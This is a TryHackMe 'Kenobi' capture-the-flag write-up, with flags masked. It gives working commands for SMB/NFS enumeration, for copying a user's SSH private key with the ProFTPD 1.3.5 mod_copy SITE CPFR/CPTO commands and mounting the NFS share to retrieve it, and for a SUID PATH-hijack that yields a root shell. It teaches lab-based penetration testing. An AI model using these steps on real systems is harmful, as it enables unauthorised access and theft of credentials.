---
layout: post
title: Kenobi - Writeup
icon: https://i.postimg.cc/kgMRqgRw/screenshot-154.jpg
date: 2023-03-26
categories: [TryHackMe]
tags: [kenobi]
pin: false
image:
  path: https://i.postimg.cc/131xXYfr/logo-4-3.png
  width: 1280   # in pixels
  height: 720   # in pixels
  alt: 
---
Helly Everyone ,

This is a free room from TryHackMe, created by **TryHackme**

[https://tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi)

This article outlines my approach to solving the “Basic Pentesting” room available on the TryHackMe platform.

> Disclaimer 
No flags (user/root) are shown in this writeup, so follow the procedures to grab the flags! Enjoy! 
{: .prompt-danger}

## Task 1 - Deploy the vulnerable machine

Let's start , Connect to the tryhackme network through your OpenVPN and proceed further.

> Q. **Make sure you're connected to our network and deploy the machine**<br>
  > *Ans : No Answer Needed*

###### Reconnaissance

We will start a Nmap scan with the -sV from performing a Version Scan and -sC for default scripts on the target machine.

```shell
    nmap -sC -sV -p- -T4 {IP} -oA nmap_result
```
{: .nolineno }

```
# Nmap 7.93 scan initiated Sun Mar 19 06:43:50 2023 as: nmap -sC -sV -T4 -p- -oA nmap_result 10.10.222.95
Nmap scan report for 10.10.222.95
Host is up (0.21s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)
|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)
|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34044/udp   mountd
|   100005  1,2,3      36649/tcp   mountd
|   100005  1,2,3      46631/udp6  mountd
|   100005  1,2,3      54371/tcp6  mountd
|   100021  1,3,4      40852/udp   nlockmgr
|   100021  1,3,4      41351/tcp   nlockmgr
|   100021  1,3,4      45181/tcp6  nlockmgr
|   100021  1,3,4      49220/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
36649/tcp open  mountd      1-3 (RPC #100005)
41351/tcp open  nlockmgr    1-4 (RPC #100021)
44665/tcp open  mountd      1-3 (RPC #100005)
48483/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m01s, deviation: 2h53m13s, median: 1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-03-19T05:48:47-05:00
| smb2-time: 
|   date: 2023-03-19T10:48:47
|_  start_date: N/A
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 19 06:48:52 2023 -- 1 IP address (1 host up) scanned in 302.34 seconds
```
{: .nolineno }
{: file="Nmap" }

We have five services running on the target machine. 
We have 21 (FTP), 22 (SSH), 80 (HTTP), 111 & 2049 (RPC), 139 & 445 (SMB).
We also got other port open since we did -p-(All ports scan) but we can ignore those ports as they are not that important for our task.

> Q. **Scan the machine with nmap, how many ports are open?**<br>
  > *Ans : 7*

## Task 2 : Enumerating Samba for shares

###### Enumeration

As we can see from our nmap results , we found port 80 open. We tried to visit it but there was just a image nothing more.

We also tried to run gobuster on the victim machine but got no luck. So let's proceed further.

```shell
gobuster dir -u 10.10.222.95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
{: .nolineno }

![image](https://i.postimg.cc/gk2pbj7q/screenshot-157.jpg){: width='1280' height='720'}

We also know that smb port is open , So let's try to enumerate that.

We can run nmap NSE scripts to enumerate smb shares. We can use specific NSE scripts by naming them but here we are going to use a wildcard for it. 

```shell
nmap --script=smb-enum* -p 445 {IP}
```
{: .nolineno }

```
# Nmap 7.93 scan initiated Sun Mar 19 08:01:15 2023 as: nmap -p 139,445 --script=smb-enum* -T4 -oN smbenum 10.10.222.95
Nmap scan report for 10.10.222.95
Host is up (0.20s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-sessions: 
|  <nobody>
| smb-enum-shares: 
|   account_used: guest
|   \10.10.222.95\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 4
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \10.10.222.95\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \10.10.222.95\print$: 
|     Type: STYPEDISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|    Current user access: <none>
| smb-enum-domains: 
|   KENOBI
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled

# Nmap done at Sun Mar 19 08:06:17 2023 -- 1 IP address (1 host up) scanned in 301.83 seconds
```
{: .nolineno }
{: file="Nmap smb-enum* NSE script results" }

As we can see we got 3 shares named IPC$ , anonymous , Print$. 
Anonymous share seems interesting. We can also see their permissions and can see that the anonymous share has Listing and Read permissions.
We can verify the permission of anonymous share by using the `enum4linux` tool 

```shell
enum4linux -a {IP}
```
{: .nolineno }

![image](https://i.postimg.cc/nzqmx0C5/screenshot-157.jpg){: width='1280' height='720'}

As we can see the anonymous share has mapping and listing permissions set to 'OK'. That's a good news for us. 
Let's try to access that anonumous share using `smbclient`
When it asks for password leave it blank and ht enter.

```shell
smbclient //IP/anonymous
```
{: .nolineno }

![image](https://i.postimg.cc/43spn4PN/screenshot-157.jpg){: width='1280' height='720'}

we can see that there is a file names `log.txt`. let's get that file to out desktop using `get` command and exit out of the smb session.

Reading the log, we can see that it contains the path for the id_rsa key stored on the target machine. Also, it points to the fact that the FTP service running on the target machine is ProFTPD.

![image](https://i.postimg.cc/XJ6zwYSG/screenshot-157.jpg){: width='1280' height='720'}

We can also enumerate the `nfs` service using nmap NSE scripts. 
```shell
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {IP}
```
{: .nolineno}

![image](https://i.postimg.cc/T2sW-Q73x/screenshot-157.jpg){: width='1280' height='720'}

> Q. **Using the nmap command above, how many shares have been found?**<br>
  > Ans : 3

> Q. **Once you're connected, list the files on the share. What is the file can you see?**<br>
  > Ans : log.txt

> Q. **What port is FTP running on?**<br>
  > Ans : 21

> Q. **What mount can we see?**<br>
  > Ans : /var

## Task 3 : Gain initial access with ProFtpd

###### Exploitation
As we need to get our hands on the id_rsa file and we see that we have the ProFTPD on the target, we need to figure out a way to get access to that file through the FTP service.

If we look at our nmap scan results earlier we can also see that the ftp version is `ProFTPD 1.3.5`.
Let's try to use searchsploit and check if this specific version is vulnerable to any exploit or not.

![image](https://i.postimg.cc/Fm8NZ5Vq/screenshot-157.jpg){: width='1280' height='720'}

As we can see an exploit is available for this ProFTPD version. We can't directly run the exploits and get the RCE ( remote code execution) as we don't have the write permissions. But when we did searchsploit we also came across a exploit named File Copy. Lets get that exploit into our local machine

![image](https://i.postimg.cc/xTvwfZ7y/screenshot-157.jpg){: width='1280' height='720'}

We used the searchsploit to download the exploit file using the -m option. Here, we see that we need to run two significant commands: CPFR which means Copy From, and CPTO means Copy To.  So we can use these commands to copy the id_rsa file from its location to a place from where we can acquire it.

```shell
searchsploit ProFTPD 1.3.5
searchsploit -m 36742
cat 36742.txt
```
{: .nolineno }

![image](https://i.postimg.cc/SxNg0QM8/screenshot-157.jpg){: width='1280' height='720'}

![image](https://i.postimg.cc/7YqF6kzP/screenshot-157.jpg){: width='1280' height='720'}

Now we know from our nmap scan earlier that we have `nfs` service running. Lets try to enumerate it and see if we have permission to mount any share.

``` shell
showmount -e {IP}
```
{: .nolineno }

![image](https://i.postimg.cc/0j1bmQsB/screenshot-157.jpg){: width='1280' height='720'}

As we can see we have  `/var` directory mountable. That's great. Now we can take advantage of both of this misconfigurations. i.e We have a ftp version vulnerable so we can enter into a machine using ftp session and copy the id_rsa file from kenobi's home directory into the folder which we have mountable permission for , and then later mount that folder in our attacking machine and acquire that id_rsa file. Let's do it. For some of you it may sound complicated at first but just follow along the process and it's very simple to understand.

We can now connect to the victim machine using `nc` (netcat). We used the CPFR command to copy the id_rsa from the home directory of the Kenobi user. Then we used the CPTO command to provide the destination address for the id_rsa file. We transferred the file to /var directory.

```shell
nc {IP} 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```
{: .nolineno}

![image](https://i.postimg.cc/FHdTprkx/screenshot-157.jpg){: width='1280' height='720'}


Now that we have successfully transferred the id_rsa into the var directory, we can mount the /var directory so that we can access the id_rsa files on our local machine.
We can create a directory named `nfs` n `/tmp` folder and the visit that folder and grab the `id_rsa` file present in the `/var` folder to our local machine and the change the permission of the `id_rsa` file to be able to use it to connect to ssh without any issue. Follow the below steps / commands.

```shell
mkdir /tmp/nfs
mount IP:/var /tmp/nfs
cd /tmp/nfs/var
cp id_rsa /home/kali/TryHackme/Kenobi/
cd /home/kali/TryHackme/Kenobi/
chmod 600 id_rsa
```
{: .nolineno}

![image](https://i.postimg.cc/8kZwVJhH/screenshot-157.jpg){: width='1280' height='720'}

![image](https://i.postimg.cc/rmNTpC8z/screenshot-157.jpg){: width='1280' height='720'}

![image](https://i.postimg.cc/Fzk2Lyvj/screenshot-157.jpg){: width='1280' height='720'}
With the help of the id_rsa key, we were able to connect to the target machine as the Kenobi user. Here we were able to read the first flag by the name of user.txt.

> Q. **What is the version?**<br>
  > *Ans : 1.3.5*

> Q. **How many exploits are there for the ProFTPd running?**<br>
  > *Ans : 4*

> Q. **We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.**<br>
  > *Ans : No Answer Needed*

> Q. **We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.**<br>
  > *Ans : No Answer Needed *

> Q. **What is Kenobi's user flag (/home/kenobi/user.txt)?**<br>
  > *Ans : *d0xxxxxxxxxxxxxxxxxxxxx9*

## Task 4 : Privilege Escalation with Path Variable Manipulation

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following:
`find / -type f -perm -04000 -ls 2>/dev/null`

![image](https://i.postimg.cc/jSZ0BQsh/screenshot-157.jpg){: width='1280' height='720'}

The `/usr/bin/menu` files looks interesting. Let's try to execute that.

We ran the menu binary to see that it prints a menu with options such as status check, kernel version, and running ifconfig. We ran the kernel version and got version 4.80. This binary must be running the command in the background to get these outputs. To understand better, we used the strings command to fetch all the human-readable snippets from the binary and found that it uses the curl command to get the localhost. As it doesn’t mention the full path of curl, we can create a malicious payload with the name curl and add it into the path. This will make the binary run our malicious file instead of the original curl.

We moved to the tmp directory and created a binary invoking the /bin/sh and named it to curl. Then we changed the permission of the binary to be executable. At last, we added this curl into the local path using the export command. Now running the menu binary, we choose an option from the menu and we got ourselves the root shell. That's it. We are done with the machine now.

```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
Id
cat /root/root.txt
```
{: file="Commands" }

![image](https://i.postimg.cc/ydFJHYLB/screenshot-157.jpg){: width='1280' height='720'}

> Q. **What file looks particularly out of the ordinary?**<br>
  > *Ans : /usr/bin/menu*

> Q. **Run the binary, how many options appear?**<br>
  > *Ans : 3*

> Q. **We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!**<br>
  > *Ans : No Answer Needed*

> Q. **What is the root flag (/root/root.txt)?**<br>
  > *Ans : 17xxxxxxxxxxxxxxxxxx02*























